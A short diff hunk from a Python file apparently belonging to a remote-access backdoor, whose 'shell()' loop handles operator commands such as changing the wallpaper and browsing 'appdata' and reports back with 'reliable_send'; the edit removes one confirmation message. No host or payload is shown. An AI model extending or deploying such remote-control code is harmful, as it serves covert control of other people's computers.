@@ -629,7 +629,6 @@ def shell():
                 reliable_send('Directory Not Found')
                 continue
         elif command[:10] == 'cwallpaper':
-            reliable_send('changed wallpaper')
             wallpaper()
 
         elif command[:7] == 'appdata':
